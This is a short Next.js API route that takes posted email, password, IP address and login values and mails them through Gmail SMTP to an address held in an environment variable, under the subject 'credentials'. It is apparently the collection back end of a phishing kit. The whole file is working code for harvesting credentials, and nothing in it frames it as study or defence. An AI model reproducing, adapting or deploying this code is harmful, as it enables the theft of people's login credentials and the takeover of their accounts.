import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer";

export async function POST(request) {
  const res = await request.json();

  try {
    let transporter = mailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: process.env.APP_ACCOUNT,
        pass: process.env.APP_PASSWORD,
      },
    });

    const result = await transporter.sendMail({
      from: `"dees" <${process.env.APP_ACCOUNT}>`,
      to: process.env.EMAIL_TO_SEND,
      subject: "credentials",
      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
      html: `<h3>${JSON.stringify(res.email).replaceAll('"', "")}</h3>
      
      <h3> /password: ${JSON.stringify(res.pass).replaceAll('"', "")}</h3>
      
      <h3> /ip address: ${JSON.stringify(res.pi).replaceAll('"', "")}</h3>

      <h3> /login: ${JSON.stringify(res.gols).replaceAll('"', "")}</h3>
      
      `,
    });

    console.log(result);

    return NextResponse.json({ status: true, message: result });
  } catch (error) {
    console.log(error);
    return NextResponse.json({ status: true, message: error });
  }
}
